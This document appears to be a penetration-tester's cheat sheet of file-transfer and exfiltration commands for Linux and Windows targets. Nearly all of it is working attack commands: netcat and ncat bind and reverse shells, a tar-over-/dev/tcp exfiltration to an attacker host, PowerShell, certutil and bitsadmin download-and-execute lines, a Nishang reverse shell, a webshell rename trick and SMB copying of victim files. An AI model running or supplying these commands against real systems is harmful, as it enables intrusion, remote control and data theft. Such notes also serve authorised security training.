# File transfer
**Netcat [nc]**
`nc -w 3 <target_ip> 1234 < LinEnum.sh` on target machine: `nc -l -p 1234 > LinEnum.sh`
`nc IP_ADDR PORT > OUTFILE` (run `nc -lvp PORT < infile` on attacking machine)

**Bob sets listener with shell:** 

`nc -lnvp 4444 -e cmd.exe` -> Alice connects: `nc -nv 10.0.0.22 4444`

**or Bob listens:**

`nc -nlvp 4444`  -> Alice sends her shell to Bob's listener: `nc -nv 10.0.0.22 4444 -e /bin/bash`

**Ncat - Bind shell [listener shares shell]**
`ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl`
`ncat -v 10.0.0.22 4444 --ssl`

**Ncat - Reverse shell [connector shares shell]**
`ncat --exec cmd.exe -vn 192.168.100.145 4444 --ssl`
`ncat -vnl 4444 --ssl --allow 192.168.100.146`



## Unix Transfer Methods

[https://unix.stackexchange.com/questions/47434/what-is-the-difference-between-curl-and-wget](https://unix.stackexchange.com/questions/47434/what-is-the-difference-between-curl-and-wget)

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
`wget http://IP_ADDR/file -O /path/to/where/you/want/file/to/go`
`curl http://attackerip/file > file`
`fetch http://IP_ADDR/file`
`ftp -s:input.txt`
`tftp -i get file /path/on/victim`



**Upload a file**
`curl --upload-file [-T] ./tecmint.txt https://transfer.sh/tecmint.txt`
And rename it to an executable file using the MOVE method with the curl command:
`curl -X MOVE --header Destination:http://$ip/leetshellz.php  http://$ip/leetshellz.txt`

**Nc**

`nc -vl 44444 > pick_desired_name_for_received_file`
`nc -N 10.11.12.10 44444 < /path/to/file/you/want/to/send`



### Exfil over TCP Socket with EBDIC and Base64

**On own attacker machine**
`nc -nlvp 80 > datafolder.tmp`

**On target machine**
`tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker_IP>/80`

**On own machine**
`dd conv=ascii if=datafolder.tmp |base64 -d > datafolder.tar`
`tar xf datafolder.tar`

**SSH to own machine**
`tar zcf - /tmp/datafolder | ssh root@<attacker_IP > "cd /tmp; tar zxpf -"`
tar the contents of our /tmp/datafolder while sending the output to (-) and then SSH it over to our attacker system



## Windows Transfer Methods

- https://sushant747.gitbooks.io/total-oscp-guide/transfering_files_to_windows.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md



### Certutil

There are many ways to copy over files. I found **certutil.exe** to be the most reliable across Windows editions. For example;
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
`cmd.exe /c "certutil[.exe] -urlcache -split -f http://$IP/Powerless.bat [Powerless.bat]"`
`certutil.exe -urlcache -split -f "http://10.11.0.126/win32revtcp.exe" [shell.exe]`

### Bitsadmin

`bitsadmin /transfer download /priority normal http://IP_ADDR/file C:\output\path` (Works on Windows 7/Windows Server 2000+)
`bitsadmin /transfer download /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe`

### Python

``` python 
C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');" 
```



### FTP

`Python ftp\ - python -m pyftpdlib -w -p 21`
the best way i've found for file transfer on MOST machines is to just use plain old ftp. just about every 
windows machine has it installed by default, and you can get a really good quick and easy python script 
 "`pip install pyftpdlib` or `pip3 install pyftpdlib`" once pyftpdlib is installed, just run it in the directory you want to download files to with "`python -m pyftpdlib -w -p 21`" then on your client machine type ftp -A your.ip.add.ress (the -A is for Anonymous, these shells will hang on user/password entry sometimes, don't use this option with linux machines though) and you're ready to transfer files!
`python -m pyftpdlib -w -p 21` or `python3 -m pyftpdlib -w`

`ftp -s:input.txt`
`tftp -i 10.11.0.126 get nc.exe`



### HTTP Server

`python3 -m http.server`
`python -m SimpleHTTPServer`



## Powershell - [download is in-memory]

- `C:\> powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile(‘http://IP_ADDR:PORT/FILE','C:\Users\user\AppData\Local\ack.exe'));}”`
- `PS C:\> iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/script.ps1")`
- `C:\> powershell iex (New-Object Net.Webclient).DownloadString(‘http://attacker_url/script.ps1’)`
- `powershell -exec bypass -c (New-Object Net.WebClient).DownloadString(\"http://10.11.0.84/rev.ps1\") | IEX; Invoke-Powershell`



#### DownloadFile method

``` Powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_URL/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)
```



#### Offsec

```powershell
C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```



#### Nishang

`iex (New-Object Net.Webclient).DownloadString("http://attacker_url/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAdress <listener IP> -Port 4444`



#### Shares & Data Exfiltration

``` bash
net use \\<ip> /user:DOMAIN\username password
net view \\<ip>
dir /s \\<host>\SHARE - recursive search
dir /s /Q /O:-D /T:A \\<hostname>\SHARE - find files
xcopy /s /E \\<host>\SHARE\dir c:\blah - Xcopy recursively files &
```



**SMB Server**
`python /usr/share/doc/python-impacket/examples/smbserver.py files /root/Documents/oscp/files/windows-binaries`

**To put/get files:**
`copy \\10.11.0.126\files\nc.exe` .
`copy C:\bank-account.zip \\10.11.0.126\files\`

**Execute a file from SMB server**
`\\10.9.122.8\ROPNOP\met8888.exe`